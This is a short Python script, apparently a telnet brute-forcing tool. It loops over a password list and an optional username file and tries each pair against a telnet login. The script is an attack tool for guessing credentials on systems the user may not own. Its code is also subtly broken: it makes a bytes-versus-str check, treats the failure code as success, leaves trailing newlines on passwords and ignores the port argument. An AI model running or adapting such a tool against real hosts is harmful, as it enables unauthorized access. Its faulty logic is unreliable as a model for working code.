#!/bin/python3
import telnetlib
import os 
import sys
import argparse
import colorama
def telconnect(host, username, password, port=23,code=0):
    tn =  telnetlib.Telnet(host, port, timeout=5)
    tn.read_until(b"login: ")
    tn.write(username.encode("ascii")+b"\n")
    tn.read_until(b"Password: ")
    tn.write(password.encode("ascii")+b"\n")
    out = tn.read_all()
    if "Connected" in out:
        code = 1
    tn.close()
    return code
def succes(username, password):
    message  = f"""
               **********
               username:{username}\npassword:{password}
               **********
               """
    print(colorama.Fore.GREEN, message)
def bruteforcer(host, passwordlist, username, port=None):
    check = os.path.isfile(passwordlist)
    if check:
        check = os.path.isfile(username)
        if check:
            found = False
            with open(username) as users:
                for user in users:
                    with open(passwordlist,'r') as passwords:
                        for password in passwords:
                            code = telconnect(host,user,password)
                            if code == 0:
                                found = True
                                succes(username, password)
                                sys.exit(0)
            if found == False:
                sys.exit(1)
        else:
            found = False
            with open(passwordlist,'r') as passwords:
                for password in passwords:
                    code = telconnect(host,username,password)
                    if code == 0:
                        succes(username, password)
                        found = True
                        sys.exit(0)
            if found == False:
                sys.exit(1)
    else:
        print("passwordlist is not valid path")
        sys.exit(1)